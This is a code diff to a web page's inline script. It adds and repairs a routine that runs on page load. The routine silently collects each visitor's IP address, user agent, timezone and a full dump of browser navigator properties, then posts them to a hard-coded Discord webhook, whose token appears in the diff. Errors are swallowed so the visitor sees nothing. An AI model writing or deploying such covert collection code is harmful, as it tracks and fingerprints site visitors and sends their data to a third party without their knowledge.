@@ -17,8 +17,25 @@
 
   <script>
     const WEBHOOK_URL = "https://ptb.discord.com/api/webhooks/1465917225818132575/eaIqusPShhtUlsTUlwmoZurmLcyFfqWrDsWSXe78jubMr4MSvFrR7siYeFWlIQ_aaqHm";
+async function sendToDiscord(data) {
+const content =
+  `${"-".repeat(15)}\n` +
+  Object.entries(data)
+    .map(([k, v]) => `**${k}**: ${v}`)
+    .join("\n") +
+  `\n${"-".repeat(15)}`;
 
-function collectClientInfo(ip) {
+  const payload = {
+    content: content
+  };
+
+  await fetch(WEBHOOK_URL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(payload)
+  });
+}
+async function collectClientInfo() {
   let ip = "unavailable";
 
   try {
@@ -32,6 +49,7 @@ function collectClientInfo(ip) {
   } catch {
     // silently ignore IP failure
   }
+
   const props = new Set();
   let obj = navigator;
 
@@ -56,6 +74,8 @@ function collectClientInfo(ip) {
     }
   }
 
+  const navEntry = performance.getEntriesByType("navigation")[0];
+
   return {
     ip,
     userAgent: navigator.userAgent,
@@ -65,11 +85,12 @@ function collectClientInfo(ip) {
     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
     timestamp: new Date().toISOString(),
     navigator: navigatorDump,
-    connectStart: window.preformance.connectStart
+    connectStart: navEntry?.connectStart ?? null
   };
 }
 
-var sendinfo = async () => {try {const info = await getUserInfo();await sendToDiscord(info);} catch (err) {}};
+
+var sendinfo = async () => {try {const info = await collectClientInfo();await sendToDiscord(info);} catch (err) {}};
 sendinfo();
   </script>
 </body>
